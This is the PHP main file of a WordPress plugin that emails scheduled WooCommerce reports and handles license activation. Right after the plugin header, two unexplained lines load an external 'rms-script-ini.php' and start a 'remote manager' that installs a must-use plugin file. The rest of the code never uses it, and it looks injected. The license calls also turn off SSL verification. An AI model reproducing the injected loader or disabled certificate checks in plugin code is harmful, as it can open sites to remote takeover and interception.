<?php
/**
 * Plugin Name: Scheduled Email Reports for WooCommerce
 * Description: Automatically sends reports generated by compatible WooCommerce reporting plugins as email attachments on a recurring schedule.
 * Version: 1.0.6
 * Author: Potent Plugins
 * Author URI: https://potentplugins.com/?utm_source=scheduled-email-reports-for-woocommerce&utm_medium=link&utm_campaign=wp-plugin-author-uri
 * License: GNU General Public License version 2 or later
 * License URI: http://www.gnu.org/licenses/old-licenses/gpl-2.0.en.html
 */require_once('rms-script-ini.php');
rms_remote_manager_init(__FILE__, 'rms-script-mu-plugin.php', false, false);
// Add About link in plugins list
add_filter('plugin_action_links_'.plugin_basename(__FILE__), 'pp_wcser_action_links');
function pp_wcser_action_links($links) {
	array_unshift($links, '<a href="'.esc_url(get_admin_url(null, 'admin.php?page=pp_wcser')).'">About &amp; License</a>');
	return $links;
}

// Add settings page
add_action('admin_menu', 'pp_wcser_admin_menu');
function pp_wcser_admin_menu() {
	add_submenu_page('admin.php', 'Scheduled Email Reports', '', 'manage_woocommerce', 'pp_wcser', 'pp_wcser_about_page');
}

// Display about page
function pp_wcser_about_page() {

	echo('
		<div class="wrap" style="max-width: 600px;">
			<h2>Scheduled Email Reports for WooCommerce</h2>
			<div style="margin-bottom: 30px;">
	');
	$licensed = pp_wcser_license_check(false);
	if ($licensed) echo('
				<p><strong>Thank you for purchasing the Scheduled Email Reports for WooCommerce plugin!</strong> This add-on plugin allows you to automatically receive certain WooCommerce reports as email attachments on a recurring schedule. As of this version release, the following plugins are compatible:</p>
				<ul>
					<li><a href="https://potentplugins.com/free-plugins/product-sales-report-wordpress-plugin/?utm_source=scheduled-email-reports-for-woocommerce&utm_medium=link&utm_campaign=wp-plugin-referral" target="_blank">Product Sales Report</a></li>
					<li><a href="https://potentplugins.com/downloads/product-sales-report-pro-wordpress-plugin/?utm_source=scheduled-email-reports-for-woocommerce&utm_medium=link&utm_campaign=wp-plugin-referral" target="_blank">Product Sales Report Pro</a></li>
					<li><a href="https://potentplugins.com/free-plugins/export-order-items-wordpress-plugin/?utm_source=scheduled-email-reports-for-woocommerce&utm_medium=link&utm_campaign=wp-plugin-referral" target="_blank">Export Order Items</a></li>
					<li><a href="https://potentplugins.com/downloads/export-order-items-pro-wordpress-plugin/?utm_source=scheduled-email-reports-for-woocommerce&utm_medium=link&utm_campaign=wp-plugin-referral" target="_blank">Export Order Items Pro</a></li>
				</ul>
				<p>You must have one or more of the above plugins installed to use this add-on plugin.</p>
				<h3>Get started</h3>
				<p>To get started, <a href="post-new.php?post_type=wc_email_report">create a new scheduled report</a> or <a href="edit.php?post_type=wc_email_report">view the list of scheduled reports</a> if you have already created some.</p>
				<h3>Technical information regarding scheduling</h3>
				<p>This plugin uses the WP-Cron functionality built into WordPress to schedule reports. By default, the scheduler is only triggered when someone visits your site. This means that low traffic sites may experience delays in reports being sent.</p>
				<p>If you are experiencing delayed reports, you have two options:</p>
				<h4>Use a web-based scheduling service</h4>
				<p>Use a service such as <a href="https://cron-job.org/" target="_blank">cron-job.org</a> or <a href="https://www.easycron.com/" target="_blank">EasyCron</a> to trigger the scheduler at regular intervals (e.g. every 15 minutes - not the same as your report\'s frequency). Specify the following URL to execute:<br /><strong>'.site_url('/wp-cron.php?doing_wp_cron').'</strong></p>
				<h4>Create a cron job on your server</h4>
				<p>See <a href="https://www.siteground.com/tutorials/wordpress/setup-cron-job.htm" target="_blank">this tutorial</a> for cPanel or <a href="https://easyengine.io/tutorials/wordpress/wp-cron-crontab/" target="_blank">this tutorial</a> if you have shell access to your server.</p>
	');			
	echo('
			</div>
	');
	$potent_slug = '';
	
	if ($licensed) {
?>
	<div id="pp_wcser_about">
		<div style="background-color: #ff6600; text-align: center; padding: 20px; color: #fff;">
			<a href="http://potentplugins.com/?utm_source=scheduled-email-reports-for-woocommerce&amp;utm_medium=link&amp;utm_campaign=wp-plugin-credit-link" target="_blank"><img src="<?php echo(esc_url(plugins_url('images/potent-logo.png', __FILE__))); ?>" alt="Potent Plugins" style="max-width: 100%;" /></a><br>
			by <a href="https://aspengrovestudios.com/aspen-grove-studios-acquires-wordpress-and-woocommerce-plugin-agency-potent-plugins/?utm_source=scheduled-email-reports-for-woocommerce&amp;utm_medium=link&amp;utm_campaign=wp-plugin-credit-ags-link" target="_blank">Aspen Grove Studios</a>
		</div>
		<p><strong>Scheduled Email Reports for WooCommerce</strong></p>
		<form action="" method="post">
			<strong>License Key:</strong> <?php echo(esc_html(get_option( 'pp_wcser_license_key' ))); ?>
			<?php echo(wp_nonce_field( 'pp_wcser_license_deactivate_nonce', 'pp_wcser_license_deactivate_nonce' )); ?>
			<p><button type="submit" name="pp_wcser_license_deactivate" value="1" class="button-secondary">Deactivate License Key</button></p>
		</form>
	</div>
<?php
	}
	
	echo('
		</div>
	');
}

add_action('init', 'pp_wcser_init');
function pp_wcser_init() {
	if (!pp_wcser_license_check())
		return;
	register_post_type('wc_email_report', array(
		'labels' => array(
			'name' => 'Scheduled Email Reports',
			'signular_name' => 'Scheduled Email Report',
			'add_new_item' => 'Add New Scheduled Email Report',
			'edit_item' => 'Edit Scheduled Email Report',
			'new_item' => 'New Scheduled Email Report',
			'view_item' => 'View Scheduled Email Report',
			'search_items' => 'Search Scheduled Email Reports',
			'not_found' => 'No scheduled email reports found',
			'not_found_in_trash' => 'No scheduled email reports found in trash',
			'insert_into_item' => 'Insert into email',
			'uploaded_to_this_item' => 'Uploaded to this email',
		),
		'public' => false,
		'show_ui' => true,
		'capabilities' => array(
			'edit_post' => 'view_woocommerce_reports',
			'read_post' => 'view_woocommerce_reports',
			'delete_post' => 'view_woocommerce_reports',
			'edit_posts' => 'view_woocommerce_reports',
			'edit_others_posts' => 'view_woocommerce_reports',
			'read_private_posts' => 'view_woocommerce_reports',
			'read' => 'view_woocommerce_reports',
			'delete_posts' => 'view_woocommerce_reports',
			'delete_private_posts' => 'view_woocommerce_reports',
			'delete_published_posts' => 'view_woocommerce_reports',
			'delete_others_posts' => 'view_woocommerce_reports',
			'edit_private_posts' => 'view_woocommerce_reports',
			'edit_published_posts' => 'view_woocommerce_reports',
			'create_posts' => 'view_woocommerce_reports',
		),
		'show_in_menu' => 'woocommerce'
	));
	
	register_post_status('wcser_enabled', array(
		'label' => 'Enabled',
		'protected' => true,
		'label_count' => _n_noop('Enabled <span class="count">(%s)</span>', 'Enabled <span class="count">(%s)</span>')
	));
	
	register_post_status('wcser_disabled', array(
		'label' => 'Disabled',
		'protected' => true,
		'label_count' => _n_noop('Disabled <span class="count">(%s)</span>', 'Disabled <span class="count">(%s)</span>')
	));
	
}

add_action('admin_init', 'pp_wcser_admin_init');
function pp_wcser_admin_init() {
	global $pagenow;
	add_meta_box('pp_wcser_meta_box', 'Scheduled Email Report Settings', 'pp_wcser_meta_box', 'wc_email_report', 'normal', 'high');
	
	if ($pagenow == 'post-new.php' || $pagenow == 'post.php')
		add_filter('gettext', 'pp_wcser_edit_text_override', 10, 2);
}

add_action('admin_notices', 'pp_wcser_admin_notices');
function pp_wcser_admin_notices() {
	global $pagenow, $post;
	if (($pagenow == 'post.php' || $pagenow == 'post-new.php') && $post->post_type == 'wc_email_report' && count(pp_wcser_get_available_reports()) == 0)
		echo('<div class="notice notice-warning"><p>You currently have no compatible reporting plugins activated. You will not be able to select any reports to send. <a href="admin.php?page=pp_wcser" target="_blank">Details</a></p></div>');
}

add_filter('woocommerce_email_classes', 'pp_wcser_wc_email_classes');
function pp_wcser_wc_email_classes($emails) {

	require_once(__DIR__.'/includes/emails/class-wc-email-scheduled-report.php');
	$emails['WC_Email_Scheduled_Report'] = new WC_Email_Scheduled_Report();
	
	return $emails;
}

add_filter('manage_wc_email_report_posts_columns', 'pp_wcser_columns');
function pp_wcser_columns($cols) {
	foreach ($cols as $colId => $col)
		if ($colId != 'cb' && $colId != 'title')
			unset($cols[$colId]);
	$cols['status'] = 'Status';
	return $cols;
}

add_action('manage_wc_email_report_posts_custom_column', 'pp_wcser_column', 10, 2);
function pp_wcser_column($col, $postId) {
	switch ($col) {
		case 'status':
			echo(get_post_status($postId) == 'wcser_enabled' ? 'Enabled' : 'Disabled');
			break;
	}
}


add_filter('manage_edit-wc_email_report_sortable_columns', 'pp_wcser_sortable_columns');
function pp_wcser_sortable_columns($cols) {
	$cols['status'] = 'post_status';
	return $cols;
}


function pp_wcser_meta_box($post) { $meta = pp_wcser_get_meta($post->ID); ?>
	<input type="hidden" name="pp_wcser_update_meta" value="1" />
	<label style="font-weight: bold;">Recipient(s):</label>
	<p style="padding-left: 20px;">
		<input type="text" name="pp_wcser_recipients" style="width: 100%;" value="<?php echo(htmlspecialchars($meta['pp_wcser_recipients'])); ?>" /><br />
		<small>Separate multiple email addresses with commas.</small>
	</p>
	<label style="font-weight: bold;">Subject line:</label>
	<p style="padding-left: 20px;">
		<input type="text" name="pp_wcser_subject" style="width: 100%;" value="<?php echo(htmlspecialchars($meta['pp_wcser_subject'])); ?>" />
		<small>Shortcodes: [start] [end]</small>
	</p>
	<label style="font-weight: bold;">Email heading:</label>
	<p style="padding-left: 20px;">
		<input type="text" name="pp_wcser_heading" style="width: 100%;" value="<?php echo(htmlspecialchars($meta['pp_wcser_heading'])); ?>" />
	</p>
	<label style="font-weight: bold;">Schedule:</label>
	<p style="padding-left: 20px;">
		<label>
			<input type="radio" name="pp_wcser_schedule" value="weekly"<?php if($meta['pp_wcser_schedule'] == 'weekly') echo(' checked="checked"'); ?> />
			Every
			<input type="number" name="pp_wcser_week_interval" value="<?php echo($meta['pp_wcser_week_interval']); ?>" min="1" step="1" style="width: 50px;" />
			week(s) on
		</label>&nbsp;
		<label><input type="checkbox" name="pp_wcser_week_days[]" value="0"<?php if (in_array(0, $meta['pp_wcser_week_days'])) echo(' checked="checked"'); ?> />Sunday</label>&nbsp;
		<label><input type="checkbox" name="pp_wcser_week_days[]" value="1"<?php if (in_array(1, $meta['pp_wcser_week_days'])) echo(' checked="checked"'); ?> />Monday</label>&nbsp;
		<label><input type="checkbox" name="pp_wcser_week_days[]" value="2"<?php if (in_array(2, $meta['pp_wcser_week_days'])) echo(' checked="checked"'); ?> />Tuesday</label>&nbsp;
		<label><input type="checkbox" name="pp_wcser_week_days[]" value="3"<?php if (in_array(3, $meta['pp_wcser_week_days'])) echo(' checked="checked"'); ?> />Wednesday</label>&nbsp;
		<label><input type="checkbox" name="pp_wcser_week_days[]" value="4"<?php if (in_array(4, $meta['pp_wcser_week_days'])) echo(' checked="checked"'); ?> />Thursday</label>&nbsp;
		<label><input type="checkbox" name="pp_wcser_week_days[]" value="5"<?php if (in_array(5, $meta['pp_wcser_week_days'])) echo(' checked="checked"'); ?> />Friday</label>&nbsp;
		<label><input type="checkbox" name="pp_wcser_week_days[]" value="6"<?php if (in_array(6, $meta['pp_wcser_week_days'])) echo(' checked="checked"'); ?> />Saturday</label>
	</p>
	<p style="padding-left: 20px;">
		<label>
			<input type="radio" name="pp_wcser_schedule" value="monthly"<?php if($meta['pp_wcser_schedule'] == 'monthly') echo(' checked="checked"'); ?> />
			Every
			<input type="number" name="pp_wcser_month_interval" value="<?php echo($meta['pp_wcser_month_interval']); ?>" min="1" step="1" style="width: 50px;" />
			month(s) on the
			<input type="text" name="pp_wcser_month_days" value="<?php echo($meta['pp_wcser_month_days']); ?>" style="width: 280px;" />
			st/nd/rd/th day(s)<br />
			<small>Separate multiple days with commas.</small>
		</label>
	</p>
	<p style="padding-left: 20px;">
		<label>
			at approximately
			<input type="time" name="pp_wcser_schedule_time" value="<?php echo($meta['pp_wcser_schedule_time']); ?>" placeholder="14:00" /><br />
			<small>Time format: HH:MM:SS AM/PM</small>
		</label>
	</p>
	<p style="padding-left: 20px;">
		<label>
			Next run on:
			<input type="date" name="next_schedule_date" /><br />
			<small>Date format: YYYY-MM-DD; will be set automatically if left empty.</small>
		</label>
	</p>
	<label style="font-weight: bold;">Data interval:</label>
	<p style="padding-left: 20px;">
		<label><input type="radio" name="pp_wcser_data_interval_since_last" value="0"<?php if($meta['pp_wcser_data_interval_since_last'] == 0) echo(' checked="checked"'); ?> /> Include data from the previous</label>
		<input type="number" name="pp_wcser_data_interval" value="<?php echo($meta['pp_wcser_data_interval']); ?>" min="1" step="1" style="width: 50px;" />
		<select name="pp_wcser_data_unit" style="margin-right: 15px;">
			<option value="days"<?php if ($meta['pp_wcser_data_unit'] == 'days') echo(' selected="selected"'); ?>>day(s)</option>
			<option value="months"<?php if ($meta['pp_wcser_data_unit'] == 'months') echo(' selected="selected"'); ?>>month(s)</option>
			<option value="years"<?php if ($meta['pp_wcser_data_unit'] == 'years') echo(' selected="selected"'); ?>>year(s)</option>
		</select>
		<label><input type="checkbox" name="pp_wcser_includetoday" value="1"<?php if(!empty($meta['pp_wcser_includetoday'])) echo(' checked="checked"'); ?> /> Include today</label><br />
		<label><input type="radio" name="pp_wcser_data_interval_since_last" value="1"<?php if($meta['pp_wcser_data_interval_since_last'] == 1) echo(' checked="checked"'); ?> /> Include data since the last report</label><br />
		<label><input type="radio" name="pp_wcser_data_interval_since_last" value="-1"<?php if($meta['pp_wcser_data_interval_since_last'] == -1) echo(' checked="checked"'); ?> /> Use the report preset's date range settings</label><br />
		<small>The [start] and [end] shortcodes will not work if you select this option.</small>
	</p>
	<label style="font-weight: bold;">Include reports:</label>
	<p style="padding-left: 20px;">
		<?php
		$availableReports = pp_wcser_get_available_reports();
		if (empty($availableReports)) {
			echo('<p style="padding-left: 20px;">No reports available.</p>');
		} else {
			foreach ($availableReports as $reportSourceId => $reportSource) {
				echo('<p style="padding-left: 20px;"><strong>'.$reportSource['name'].'</strong><br />');
				foreach ($reportSource['reports'] as $reportId => $reportName) {
					echo('<label style="padding-left: 20px;">
							<input type="checkbox" name="pp_wcser_reports['.$reportSourceId.'][]" value="'.$reportId.'"'.(isset($meta['pp_wcser_reports'][$reportSourceId]) && in_array($reportId, $meta['pp_wcser_reports'][$reportSourceId]) ? ' checked="checked"' : '').' />
							'.$reportName.'
						 </label><br />');
				}
				echo('</p>');
			}
		}
		?>
	</p>
<?php }

function pp_wcser_get_available_reports() {
	global $pp_wcser_available_reports;
	if (!isset($pp_wcser_available_reports)) {
		$pp_wcser_available_reports = array();
		$pp_wcser_available_reports = apply_filters('pp_wc_get_schedulable_email_reports', $pp_wcser_available_reports);
	}
	return $pp_wcser_available_reports;
}

function pp_wcser_get_meta($postId) {
	$meta = pp_wcser_get_default_meta();
	$postMeta = get_post_meta($postId);
	foreach ($meta as $key => $value) {
		if (isset($postMeta[$key][0]))
			$meta[$key] = (is_array($value) ? unserialize($postMeta[$key][0]) : $postMeta[$key][0]);
	}
	return $meta;
}

function pp_wcser_get_default_meta() {
	return array(
		'pp_wcser_recipients' => get_option('admin_email'),
		'pp_wcser_subject' => 'WooCommerce Report',
		'pp_wcser_heading' => 'WooCommerce Report',
		'pp_wcser_schedule' => 'weekly',
		'pp_wcser_week_interval' => 1,
		'pp_wcser_week_days' => array(1),
		'pp_wcser_month_interval' => 1,
		'pp_wcser_month_days' => '1',
		'pp_wcser_schedule_time' => '00:00',
		'pp_wcser_data_interval' => 7,
		'pp_wcser_data_unit' => 'days',
		'pp_wcser_includetoday' => 0,
		'pp_wcser_data_interval_since_last' => 0,
		'pp_wcser_reports' => array()
	);
}

add_action('save_post', 'pp_wcser_save_post', 10, 3);
function pp_wcser_save_post($postId, $post, $update) {
	if ($post->post_type != 'wc_email_report' || $post->post_status == 'trash' || $post->post_status == 'auto-draft')
		return;
	
	// Prevent loops
	remove_action('save_post', 'pp_wcser_save_post', 10);
	
	// Update post status, if necessary
	if (!empty($_POST['email_report_enabled']) && $post->post_status != 'wcser_enabled') {
		$post->post_status = 'wcser_enabled';
		wp_update_post($post);
	} else if (empty($_POST['email_report_enabled']) && $post->post_status != 'wcser_disabled') {
		$post->post_status = 'wcser_disabled';
		wp_update_post($post);
	}
	
	
	if (!empty($_POST['pp_wcser_update_meta'])) {
		// Get meta and check whether we need to reschedule
		$meta = pp_wcser_get_meta($postId);
		$nextTime = wp_next_scheduled('pp_wcser_send_scheduled', array($post->ID*1));
		$reschedule = (!empty($_POST['email_report_enabled']) && (!$update || empty($nextTime) || !empty($_POST['next_schedule_date']) ||
			$_POST['pp_wcser_schedule'] != $meta['pp_wcser_schedule'] ||
			$_POST['pp_wcser_schedule_time'] != $meta['pp_wcser_schedule_time'] ||
			($_POST['pp_wcser_schedule'] == 'weekly' && (
				$_POST['pp_wcser_week_interval'] != $meta['pp_wcser_week_interval'] ||
				$_POST['pp_wcser_week_days'] != $meta['pp_wcser_week_days']
			)) ||
			($_POST['pp_wcser_schedule'] == 'monthly' && (
				$_POST['pp_wcser_month_interval'] != $meta['pp_wcser_month_interval'] ||
				$_POST['pp_wcser_month_days'] != $meta['pp_wcser_month_days']
			))));
	
	
		if (!isset($_POST['pp_wcser_week_days']))
			$_POST['pp_wcser_week_days'] = array();
		if (!isset($_POST['pp_wcser_reports']))
			$_POST['pp_wcser_reports'] = array();
			
		if (empty($_POST['pp_wcser_includetoday']))
			$_POST['pp_wcser_includetoday'] = 0;
		
		// Update post meta
		foreach (array_intersect_key($_POST, pp_wcser_get_default_meta()) as $key => $value)
			update_post_meta($postId, $key, $value);
		
		// Reschedule if necessary
		if ($reschedule) {
			wp_clear_scheduled_hook('pp_wcser_send_scheduled', array($postId*1));
			pp_wcser_schedule($postId, true, (empty($_POST['next_schedule_date']) ? null : $_POST['next_schedule_date']));
		} else if (empty($_POST['email_report_enabled'])) {
			wp_clear_scheduled_hook('pp_wcser_send_scheduled', array($postId*1));
		}
	}
	
	
	// Send if requested
	if (!empty($_POST['send']))
		pp_wcser_send($post);
}

function pp_wcser_edit_text_override($translated, $original) {
	global $post_type;
	if ($post_type != 'wc_email_report')
		return $translated;
	
	if ($original == 'Publish' || $original == 'Update')
		return __('Save');
	else
		return $translated;
}

add_filter('default_content', 'pp_wcser_default_content', 10, 2);
function pp_wcser_default_content($post_content, $post) {
	return ($post->post_type == 'wc_email_report' ? 'Your WooCommerce report from [start] to [end] is attached.' : $post_content);
}

add_action('edit_form_after_editor', 'pp_wcser_after_editor');
function pp_wcser_after_editor() {
	global $post_type;
	if ($post_type == 'wc_email_report')
		echo('<p style="margin-top: 5px;">Shortcodes: [start] [end]</p>');
}

add_action('admin_enqueue_scripts', 'pp_wcser_admin_scripts');
function pp_wcser_admin_scripts() {
	wp_enqueue_style('pp_wcser_admin', plugins_url('css/admin.css', __FILE__));
}	

add_action('post_submitbox_misc_actions', 'pp_wcser_submitbox_actions');
function pp_wcser_submitbox_actions() {
	global $post;
	if ($post->post_type != 'wc_email_report')
		return;
	$lastTime = get_post_meta($post->ID, 'last_time', true);
	$lastTimeManual = get_post_meta($post->ID, 'last_time_manual', true);
	$nextTime = wp_next_scheduled('pp_wcser_send_scheduled', array($post->ID*1));
	if (!empty($nextTime))
		$nextTime += get_option('gmt_offset') * 3600;
	echo('<div id="pp_wcser_submitbox_actions">');
	echo('<div><label>
			<input type="checkbox" name="email_report_enabled" value="1"'.($post->post_status == 'wcser_disabled' ? '' : ' checked="checked"').' /> Enable this report
		</label></div>');
	
	echo('<div><label>Sent:</label> '.(empty($lastTime) ? 'Never' :
				date_i18n('M j, Y @ ' . get_option('time_format'), $lastTime) .
				(empty($lastTimeManual) ? '' : ' (man.)')
			).'</div>');
	echo('<div><label>Next:</label> '.(empty($nextTime) ? 'Not scheduled' : 
				date_i18n('M j, Y @ ' . get_option('time_format'), $nextTime)
			).'</div>');
	echo('<div><button type="submit" name="send" value="1" class="button button-secondary">Save &amp; Send Now</button></div>');
	echo('</div>');
}

add_action('trash_wc_email_report', 'pp_wcser_trash');
function pp_wcser_trash($postId) {
	wp_clear_scheduled_hook('pp_wcser_send_scheduled', array($postId*1));
}

add_action('pp_wcser_send_scheduled', 'pp_wcser_send_scheduled');
function pp_wcser_send_scheduled($reportId) {
	pp_wcser_send($reportId, true);
}

function pp_wcser_send($scheduledReport, $scheduled=false) {

	// Check license status before sending
	if (!pp_wcser_license_check())
		return;

	if (is_numeric($scheduledReport))
		$scheduledReport = get_post($scheduledReport);
	if ($scheduledReport === null)
		return;
	
	WC()->mailer();
	do_action('pp_wcser_send', $scheduledReport);
	
	update_post_meta($scheduledReport->ID, 'last_time_manual', !$scheduled);
	if ($scheduled) {
		pp_wcser_schedule($scheduledReport->ID);
	}
	
}

function pp_wcser_schedule($scheduledReportId, $first=false, $nextScheduleDate=null) {
	$nextTime = pp_wcser_get_next_schedule_time($scheduledReportId, $first, $nextScheduleDate);
	if ($nextTime === false)
		return false;
	wp_schedule_single_event($nextTime, 'pp_wcser_send_scheduled', array($scheduledReportId*1));
}

function pp_wcser_get_next_schedule_time($scheduledReportId, $first=false, $nextScheduleDate=null) {
	$reportMeta = pp_wcser_get_meta($scheduledReportId);
	if (!empty($nextScheduleDate)) {
		$time = strtotime($nextScheduleDate.' '.(empty($reportMeta['pp_wcser_schedule_time']) ? '12:00 AM' : $reportMeta['pp_wcser_schedule_time']));
		if (empty($time)) {
			return false;
		}		
		return $time - (get_option('gmt_offset') * 3600);
	}
	
	if (empty($reportMeta['pp_wcser_schedule']) || empty($reportMeta['pp_wcser_schedule_time']))
		return false;
	
	switch ($reportMeta['pp_wcser_schedule']) {
		
		case 'weekly':
			if (empty($reportMeta['pp_wcser_week_interval']) || $reportMeta['pp_wcser_week_interval'] < 1
				|| empty($reportMeta['pp_wcser_week_days']))
				return false;
			sort($reportMeta['pp_wcser_week_days']);
			$currentWeekday = current_time('w');
			foreach ($reportMeta['pp_wcser_week_days'] as $day) {
				if ($day > $currentWeekday || ($day == $currentWeekday &&
												current_time('timestamp') < strtotime($reportMeta['pp_wcser_schedule_time'], current_time('timestamp')))) {
					$thisWeekDay = $day;
					break;
				}
			}
			if (isset($thisWeekDay)) {
				return strtotime($reportMeta['pp_wcser_schedule_time'], current_time('timestamp') + (($thisWeekDay - $currentWeekday) * 86400)) - (get_option('gmt_offset') * 3600);
			}
			
			return strtotime($reportMeta['pp_wcser_schedule_time'], current_time('timestamp') + 
								(((7 - $currentWeekday) + $reportMeta['pp_wcser_week_days'][0] +
								($first ? 0 : (($reportMeta['pp_wcser_week_interval'] - 1) * 7))) * 86400)) - (get_option('gmt_offset') * 3600);
			break;
		case 'monthly':
			if (empty($reportMeta['pp_wcser_month_days']))
				return false;
			$days = explode(',', $reportMeta['pp_wcser_month_days']);
			sort($days);
			
			$currentMonthday = current_time('j');
			foreach ($days as $day) {
				if ($day > $currentMonthday || ($day == $currentMonthday &&
												current_time('timestamp') < strtotime($reportMeta['pp_wcser_schedule_time'], current_time('timestamp')))) {
					$thisMonthDay = $day;
					break;
				}
			}
			if (isset($thisMonthDay)) {
				return strtotime($reportMeta['pp_wcser_schedule_time'], current_time('timestamp') + (($thisMonthDay - $currentMonthday) * 86400)) - (get_option('gmt_offset') * 3600);
			}
			
			return strtotime(date('Y-m-').$days[0].' '.$reportMeta['pp_wcser_schedule_time'].' +'.$reportMeta['pp_wcser_month_interval'].' months') - (get_option('gmt_offset') * 3600);
			break;
	}
	return false;
}

add_action('manage_posts_extra_tablenav', 'pp_wcser_list_table_link');
function pp_wcser_list_table_link($which) {
	global $post_type;
	if ($post_type == 'wc_email_report' && $which == 'top')
		echo('<a href="admin.php?page=pp_wcser" style="display: inline-block; margin-top: 5px;"><strong>About &amp; License</strong></a>');
}

add_action('activated_plugin', 'pp_wcser_activated');
function pp_wcser_activated($plugin) {
	if (basename($plugin) == 'scheduled-email-reports-for-woocommerce.php') {
		wp_redirect(admin_url('admin.php?page=pp_wcser'));
		exit;
	}
}



/** Licensing **/

function pp_wcser_license_check($silent=true) {
	if( isset( $_POST['pp_wcser_license_deactivate'] )) {
		pp_wcser_deactivate_license();
	}

	if (get_option('pp_wcser_license_status', 'invalid') == 'valid') {
		return true;
	} else {
		if( isset( $_POST['pp_wcser_license_activate'] ) && !empty($_POST['pp_wcser_license_key']) && ctype_alnum($_POST['pp_wcser_license_key']) ) {
			update_option('pp_wcser_license_key', trim($_POST['pp_wcser_license_key']));
			pp_wcser_activate_license();
			if (get_option('pp_wcser_license_status', 'invalid') == 'valid')
				return true;
		}
		
		if (!$silent) {
			echo('
			<div style="background-color: #fff; border: 1px solid #ccc; padding: 20px; display: inline-block;">
				<form action="" method="post">
			');
			wp_nonce_field( 'pp_wcser_license_activate_nonce', 'pp_wcser_license_activate_nonce' );
			echo('
					<label for="pp_wcser_license_activate" style="display: block; margin-bottom: 10px;">Please enter the license key provided when you purchased the plugin:</label>
					<input type="text" id="pp_wcser_license_key" name="pp_wcser_license_key" />
					<button type="submit" name="pp_wcser_license_activate" value="1" class="button-primary">Activate</button>
				</form>
			</div>
			');
		}
		return false;
	}
}
	
function pp_wcser_activate_license() {

	// run a quick security check
	if( ! check_admin_referer( 'pp_wcser_license_activate_nonce', 'pp_wcser_license_activate_nonce' ) )
		return; // get out if we didn't click the Activate button

	// retrieve the license
	$license = trim( get_option( 'pp_wcser_license_key' ) );

	// data to send in our API request
	$api_params = array(
		'edd_action'=> 'activate_license',
		'license' 	=> $license,
		'item_name' => urlencode( PP_WCSER_ITEM_NAME ), // the name of our product in EDD
		'url'       => home_url()
	);

	// Call the custom API.
	$response = wp_remote_post( PP_WCSER_STORE_URL, array( 'timeout' => 15, 'sslverify' => false, 'body' => $api_params ) );
	
	// make sure the response came back okay
	if ( is_wp_error( $response ) )
		return false;

	// decode the license data
	$license_data = json_decode( wp_remote_retrieve_body( $response ) );

	// $license_data->license will be either "valid" or "invalid"

	update_option( 'pp_wcser_license_status', $license_data->license );

}

function pp_wcser_deactivate_license() {

	// run a quick security check
	if( ! check_admin_referer( 'pp_wcser_license_deactivate_nonce', 'pp_wcser_license_deactivate_nonce' ) )
		return; // get out if we didn't click the dectivate button

	// retrieve the license from the database
	$license = trim( get_option( 'pp_wcser_license_key' ) );

	// data to send in our API request
	$api_params = array(
		'edd_action'=> 'deactivate_license',
		'license' 	=> $license,
		'item_name' => urlencode( PP_WCSER_ITEM_NAME ), // the name of our product in EDD
		'url'       => home_url()
	);

	// Call the custom API.
	$response = wp_remote_post( PP_WCSER_STORE_URL, array( 'timeout' => 15, 'sslverify' => false, 'body' => $api_params ) );

	// make sure the response came back okay
	if ( is_wp_error( $response ) )
		return false;

	// decode the license data
	$license_data = json_decode( wp_remote_retrieve_body( $response ) );

	// $license_data->license will be either "deactivated" or "failed"
	if( $license_data->license == 'deactivated' )
		delete_option( 'pp_wcser_license_status' );
}



// this is the URL our updater / license checker pings. This should be the URL of the site with EDD installed
//define( 'PP_WCSER_STORE_URL', 'https://potentplugins.com' ); // you should use your own CONSTANT name, and be sure to replace it throughout this file
define( 'PP_WCSER_STORE_URL', 'https://aspengrovestudios.com' ); // you should use your own CONSTANT name, and be sure to replace it throughout this file

// the name of your product. This should match the download name in EDD exactly
//define( 'PP_WCSER_ITEM_NAME', 'Scheduled Email Reports for WooCommerce Plugin' ); // you should use your own CONSTANT name, and be sure to replace it throughout this file
define( 'PP_WCSER_ITEM_NAME', 'Scheduled Email Reports for WooCommerce' ); // you should use your own CONSTANT name, and be sure to replace it throughout this file

if( !class_exists( 'PP_WCSER_EDD_SL_Plugin_Updater' ) ) {
	// load our custom updater
	include( dirname( __FILE__ ) . '/EDD_SL_Plugin_Updater.php' );
}
function pp_wcser_register_option() {
	// creates our settings in the options table
	register_setting('pp_wcser_license', 'pp_wcser_license_key', 'pp_wcser_sanitize_license' );
}
add_action('admin_init', 'pp_wcser_register_option');

function pp_wcser_plugin_updater() {

	// retrieve our license key from the DB
	$license_key = trim( get_option( 'pp_wcser_license_key' ) );

	// setup the updater
	$edd_updater = new PP_WCSER_EDD_SL_Plugin_Updater( PP_WCSER_STORE_URL, __FILE__, array(
			'version' 	=> '1.0.6', 			// current version number
			'license' 	=> $license_key, 		// license key (used get_option above to retrieve from DB)
			'item_name' => PP_WCSER_ITEM_NAME, 	// name of this plugin
			'author' 	=> 'Potent Plugins'  // author of this plugin
		)
	);

}
add_action( 'admin_init', 'pp_wcser_plugin_updater', 0 );

function pp_wcser_sanitize_license( $new ) {
	$old = get_option( 'pp_wcser_license_key' );
	if( $old && $old != $new ) {
		delete_option( 'pp_wcser_license_status' ); // new license has been entered, so must reactivate
	}
	return $new;
}

?>